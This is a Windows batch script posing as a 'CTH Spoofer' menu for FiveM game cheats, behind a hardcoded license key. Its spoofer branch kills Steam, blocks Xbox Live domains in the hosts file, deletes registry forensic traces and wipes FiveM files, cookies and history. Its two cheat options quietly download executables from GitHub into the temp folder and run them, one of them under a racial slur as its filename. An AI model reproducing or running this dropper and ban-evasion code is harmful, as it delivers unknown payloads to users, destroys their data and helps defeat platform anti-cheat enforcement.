@shift /0
@echo off
chcp 65001
title .gg/uzec3qhSyE
mode 80,15
cls
echo.
echo.
goto menu

:menu
mode 130,30 
echo 	 [36m██████╗████████╗██╗  ██╗    ███████╗██████╗  ██████╗  ██████╗ ███████╗███████╗██████╗ 
echo 	[36m██╔════╝╚══██╔══╝██║  ██║    ██╔════╝██╔══██╗██╔═══██╗██╔═══██╗██╔════╝██╔════╝██╔══██╗
echo 	[36m██║        ██║   ███████║    ███████╗██████╔╝██║   ██║██║   ██║█████╗  █████╗  ██████╔╝
echo 	[36m██║        ██║   ██╔══██║    ╚════██║██╔═══╝ ██║   ██║██║   ██║██╔══╝  ██╔══╝  ██╔══██╗
echo 	[36m╚██████╗   ██║   ██║  ██║    ███████║██║     ╚██████╔╝╚██████╔╝██║     ███████╗██║  ██║
echo 	 [36m╚═════╝   ╚═╝   ╚═╝  ╚═╝    ╚══════╝╚═╝      ╚═════╝  ╚═════╝ ╚═╝     ╚══════╝╚═╝  ╚═╝
echo.
echo.
echo.
echo [36m Please log in.[0m
echo.
set /p haslo=[36mLicense key: 
:haslo
if %haslo%==bartx2 goto menu2
echo [31mLicense key not found!
timeout 1 >nul
goto menu

:menu2
cls
mode 130,30
echo 	 [36m██████╗████████╗██╗  ██╗    ███████╗██████╗  ██████╗  ██████╗ ███████╗███████╗██████╗ 
echo 	[36m██╔════╝╚══██╔══╝██║  ██║    ██╔════╝██╔══██╗██╔═══██╗██╔═══██╗██╔════╝██╔════╝██╔══██╗
echo 	[36m██║        ██║   ███████║    ███████╗██████╔╝██║   ██║██║   ██║█████╗  █████╗  ██████╔╝
echo 	[36m██║        ██║   ██╔══██║    ╚════██║██╔═══╝ ██║   ██║██║   ██║██╔══╝  ██╔══╝  ██╔══██╗
echo 	[36m╚██████╗   ██║   ██║  ██║    ███████║██║     ╚██████╔╝╚██████╔╝██║     ███████╗██║  ██║
echo 	 [36m╚═════╝   ╚═╝   ╚═╝  ╚═╝    ╚══════╝╚═╝      ╚═════╝  ╚═════╝ ╚═╝     ╚══════╝╚═╝  ╚═╝
echo.
echo.
echo [32mLogin succesful![0m
echo.
echo [36mPlease select one of our products.[0m
echo [36m 1 - Spoofer
echo [36m 2 - FiveM Cheat
echo [36m 3 - Slinky Client
set /p asd=[36mProduct: 
if %asd%==1 goto spooferstart
if %asd%==2 goto cheat
if %asd%==3 goto slinky
echo [31mWrong option!
timeout 3 >nul
goto menu2
:spooferstart
cls
mode 130,30
echo 	 [36m██████╗████████╗██╗  ██╗    ███████╗██████╗  ██████╗  ██████╗ ███████╗███████╗██████╗ 
echo 	[36m██╔════╝╚══██╔══╝██║  ██║    ██╔════╝██╔══██╗██╔═══██╗██╔═══██╗██╔════╝██╔════╝██╔══██╗
echo 	[36m██║        ██║   ███████║    ███████╗██████╔╝██║   ██║██║   ██║█████╗  █████╗  ██████╔╝
echo 	[36m██║        ██║   ██╔══██║    ╚════██║██╔═══╝ ██║   ██║██║   ██║██╔══╝  ██╔══╝  ██╔══██╗
echo 	[36m╚██████╗   ██║   ██║  ██║    ███████║██║     ╚██████╔╝╚██████╔╝██║     ███████╗██║  ██║
echo 	 [36m╚═════╝   ╚═╝   ╚═╝  ╚═╝    ╚══════╝╚═╝      ╚═════╝  ╚═════╝ ╚═╝     ╚══════╝╚═╝  ╚═╝
echo [36mStarting spoofer.
timeout 1 >nul
taskkill /f /im Steam.exe /t
set hostspath=%windir%\System32\drivers\etc\hosts
echo 127.0.0.1 xboxlive.com >> %hostspath%
echo 127.0.0.1 user.auth.xboxlive.com >> %hostspath%
echo 127.0.0.1 presence-heartbeat.xboxlive.com >> %hostspath%
REG DELETE HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\MSLicensing\HardwareID /f
REG DELETE HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\MSLicensing\Store /f
REG DELETE HKEY_CURRENT_USER\Software\WinRAR\ArcHistory /f
REG DELETE HKEY_LOCAL_MACHINE\SYSTEM\ControlSet001\Services\bam\State\UserSettings\S-1-5-21-1282084573-1681065996-3115981261-1001 /va /f
REG DELETEH KEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\FeatureUsage\ShowJumpView /f
REG DELETEH KEY_CURRENT_USER\Software\Classes\Local Settings\Software\Microsoft\Windows\Shell\MuiCache /f
REG DELETE HKEY_CURRENT_USER\Software\WinRAR\ArcHistory /f
REG DELETE HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\FeatureUsage\AppSwitched /f
REG DELETE HKEY_CLASSES_ROOT\Local Settings\Software\Microsoft\Windows\Shell\MuiCache /f
REG DELETE HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\FeatureUsage\ShowJumpView /f
REG DELETE HKEY_LOCAL_MACHINE\SYSTEM\ControlSet001\Services\bam\State\UserSettings\S-1-5-21-332004695-2829936588-140372829-1002 /f
REG DELETE HKEY_CLASSES_ROOT\Local Settings\Software\Microsoft\Windows\Shell\MuiCache /f
REG DELETE HKEY_CURRENT_USER\Software\Classes\Local Settings\Software\Microsoft\Windows\Shell\MuiCache /f
REG DELETE HKEY_CURRENT_USER\Software\Microsoft\Windows NT\CurrentVersion\AppCompatFlags\Compatibility Assistant\Store /f
REG DELETE HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\FeatureUsage\AppSwitched /f
REG DELETE HKEY_LOCAL_MACHINE\SYSTEM\ControlSet001\Services\bam\State\UserSettings\S-1-5-21-1282084573-1681065996-3115981261-1001 /f
REG DELETE HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\FeatureUsage\AppSwitched /f
deltree /y c:\windows\tempor~1
deltree /y c:\windows\temp
deltree /y c:\windows\tmp
deltree /y c:\windows\ff*.tmp
deltree /y c:\windows\history
deltree /y c:\windows\cookies
deltree /y c:\windows\recent
deltree /y c:\windows\spool\printers
del /s /q /f "%LocalAppData%\FiveM\FiveM.app\cfx_curl_x86_64.dll
rmdir /s /q "%LocalAppData%\FiveM\FiveM.app\cache\Browser"
rmdir /s /q "%LocalAppData%\FiveM\FiveM.app\cache\db"
rmdir /s /q "%LocalAppData%\FiveM\FiveM.app\cache\dunno"
rmdir /s /q "%LocalAppData%\FiveM\FiveM.app\cache\priv"
rmdir /s /q "%LocalAppData%\FiveM\FiveM.app\cache\servers"
rmdir /s /q "%LocalAppData%\FiveM\FiveM.app\cache\subprocess"
rmdir /s /q "%LocalAppData%\FiveM\FiveM.app\cache\unconfirmed"
del /s /q /f %LocalAppData%\FiveM\FiveM.app\steam_api64.dll
rmdir /s /q "%LocalAppData%\FiveM\FiveM.app\cache\authbrowser"
del /s /q /f "%LocalAppData%\FiveM\FiveM.app\cache\crashometry"
del /s /q /f "%LocalAppData%\FiveM\FiveM.app\cache\launcher_skip"
del /s /q /f "%LocalAppData%\FiveM\FiveM.app\cache\launcher_skip_mtl2"
rmdir /s /q "%LocalAppData%\DigitalEntitlements"
del /s /q /f %LocalAppData%\FiveM\FiveM.app\profiles.dll
del /s /q /f %LocalAppData%\FiveM\FiveM.app\CitizenFX_SubProcess_chrome.bin
del /s /q /f %LocalAppData%\FiveM\FiveM.app\CitizenFX_SubProcess_game.bin
del /s /q /f %LocalAppData%\FiveM\FiveM.app\CitizenFX_SubProcess_game_372.bin
del /s /q /f %LocalAppData%\FiveM\FiveM.app\CitizenFX_SubProcess_game_1604.bin
del /s /q /f %LocalAppData%\FiveM\FiveM.app\CitizenFX_SubProcess_game_1868.bin
del /s /q /f %LocalAppData%\FiveM\FiveM.app\CitizenFX_SubProcess_game_2060.bin
del /s /q /f %LocalAppData%\FiveM\FiveM.app\CitizenFX_SubProcess_game_2189.bin
del /s /q /f "%LocalAppData%\FiveM\FiveM.app\mods\*.*"
del /s /q /f "%LocalAppData%\FiveM\FiveM.app\logs\*.*"
del /s /q /f %LocalAppData%\FiveM\FiveM.app\CitizenGame.dll
del /s /q /f "%LocalAppData%\FiveM\FiveM.app\cfx_curl_x86_64.dll
del /s /q /f %LocalAppData%\FiveM\FiveM.app\steam.dll
rmdir /s /q %userprofile%\AppData\Roaming\CitizenFX
del /s /q /f %LocalAppData%\FiveM\FiveM.app\asi-five.dll
del /s /q /f %LocalAppData%\FiveM\FiveM.app\CitizenFX.ini
del /s /q /f %LocalAppData%\FiveM\FiveM.app\caches.XML
del /s /q /f %LocalAppData%\FiveM\FiveM.app\adhesive.dll
del /s /q /f %LocalAppData%\FiveM\FiveM.app\discord.dll
del /s /q /f "%LocalAppData%\FiveM\FiveM.app\crashes\*.*"
RENAME %userprofile%\AppData\Roaming\discord\0.0.309\modules\discord_rpc CTHSPOOFER
timeout 1 >nul
cls
echo.
echo.
echo [36mUnbanned!
timeout 3 >nul
exit

:cheat
cls
mode 130,30
echo 	 [36m██████╗████████╗██╗  ██╗    ███████╗██████╗  ██████╗  ██████╗ ███████╗███████╗██████╗ 
echo 	[36m██╔════╝╚══██╔══╝██║  ██║    ██╔════╝██╔══██╗██╔═══██╗██╔═══██╗██╔════╝██╔════╝██╔══██╗
echo 	[36m██║        ██║   ███████║    ███████╗██████╔╝██║   ██║██║   ██║█████╗  █████╗  ██████╔╝
echo 	[36m██║        ██║   ██╔══██║    ╚════██║██╔═══╝ ██║   ██║██║   ██║██╔══╝  ██╔══╝  ██╔══██╗
echo 	[36m╚██████╗   ██║   ██║  ██║    ███████║██║     ╚██████╔╝╚██████╔╝██║     ███████╗██║  ██║
echo 	 [36m╚═════╝   ╚═╝   ╚═╝  ╚═╝    ╚══════╝╚═╝      ╚═════╝  ╚═════╝ ╚═╝     ╚══════╝╚═╝  ╚═╝
echo [36mStarting cheat.
cd %temp%
curl -s https://raw.githubusercontent.com/Bezikk/asdfasfdddsafaa/main/gowno.exe --output gowno.exe
gowno.exe
timeout 3 >nul
exit

:slinky
echo 	 [36m██████╗████████╗██╗  ██╗    ███████╗██████╗  ██████╗  ██████╗ ███████╗███████╗██████╗ 
echo 	[36m██╔════╝╚══██╔══╝██║  ██║    ██╔════╝██╔══██╗██╔═══██╗██╔═══██╗██╔════╝██╔════╝██╔══██╗
echo 	[36m██║        ██║   ███████║    ███████╗██████╔╝██║   ██║██║   ██║█████╗  █████╗  ██████╔╝
echo 	[36m██║        ██║   ██╔══██║    ╚════██║██╔═══╝ ██║   ██║██║   ██║██╔══╝  ██╔══╝  ██╔══██╗
echo 	[36m╚██████╗   ██║   ██║  ██║    ███████║██║     ╚██████╔╝╚██████╔╝██║     ███████╗██║  ██║
echo 	 [36m╚═════╝   ╚═╝   ╚═╝  ╚═╝    ╚══════╝╚═╝      ╚═════╝  ╚═════╝ ╚═╝     ╚══════╝╚═╝  ╚═╝
cd %temp%
curl -s https://raw.githubusercontent.com/Bezikk/wyglond.dev/scripts/niger.exe --output niger.exe
echo [36mDownloading updates.
timeout 1 >nul
echo [36mStarting cheat.
start niger.exe
